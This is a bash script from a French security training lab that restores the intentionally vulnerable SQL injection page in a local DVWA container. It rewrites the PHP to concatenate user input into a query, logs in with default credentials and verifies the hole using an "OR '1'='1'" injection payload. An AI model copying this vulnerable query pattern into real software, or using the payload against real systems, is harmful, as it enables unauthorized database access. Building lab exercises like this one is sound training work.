#!/bin/bash
# restore_sqli.sh — RESTAURE la faille SQLi DVWA (concaténation d'origine)
# Usage: bash labs_resolution/jour-01/restore_sqli.sh
set -euo pipefail
cd "$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/../.." && pwd)"
source env.sh

echo "=========================================="
echo " restore_sqli.sh — Restauration faille SQLi"
echo "=========================================="
echo "[*] Connexion au conteneur dvwa..."

CID=$(sg docker -c "docker compose ps -q dvwa" 2>/dev/null)
[ -z "$CID" ] && echo "[!] Conteneur dvwa introuvable" && exit 1
echo "[*] Conteneur : $CID"

sg docker -c "docker exec -i $CID bash" << 'SCRIPT'
cat > /var/www/html/vulnerabilities/sqli/source/low.php << 'PHPEOF'
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    $id = $_REQUEST[ 'id' ];

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    while( $row = mysqli_fetch_assoc( $result ) ) {
        $first = $row["first_name"];
        $last  = $row["last_name"];
        $html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
PHPEOF
SCRIPT

echo "[+] SQLi restaurée : concaténation vulnérable"
echo "[+] Fichier : /var/www/html/vulnerabilities/sqli/source/low.php"

echo ""
echo "[*] Vérification injection :"
rm -f /tmp/dvwa_cookie_rs.txt
TOKEN=$(curl -s -c /tmp/dvwa_cookie_rs.txt "http://localhost:$DVWA_PORT/login.php" \
    | grep -oP "user_token' value='\K[a-f0-9]+")
curl -s -b /tmp/dvwa_cookie_rs.txt -c /tmp/dvwa_cookie_rs.txt \
    -d "username=admin&password=password&user_token=$TOKEN&Login=Login" \
    "http://localhost:$DVWA_PORT/login.php" -o /dev/null

echo -n "  id=1 (normal)     → "
NORMAL=$(curl -s -b /tmp/dvwa_cookie_rs.txt -G \
    "http://localhost:$DVWA_PORT/vulnerabilities/sqli/" \
    --data-urlencode "id=1" \
    --data-urlencode "Submit=Submit" | grep -oP 'First name:' | wc -l)
echo "$NORMAL résultat(s)"

echo -n "  id=1' OR '1'='1' → "
INJECT=$(curl -s -b /tmp/dvwa_cookie_rs.txt -G \
    "http://localhost:$DVWA_PORT/vulnerabilities/sqli/" \
    --data-urlencode "id=1' OR '1'='1' -- -" \
    --data-urlencode "Submit=Submit" | grep -oP 'First name:' | wc -l)
echo "$INJECT résultat(s)"

if [ "$INJECT" -gt "$NORMAL" ]; then
    echo "  ✅ Faille active : injection retourne $INJECT résultats (normal=$NORMAL)"
else
    echo "  ⚠️  Injection non détectée (normal=$NORMAL, inject=$INJECT)"
fi
rm -f /tmp/dvwa_cookie_rs.txt
echo "=========================================="
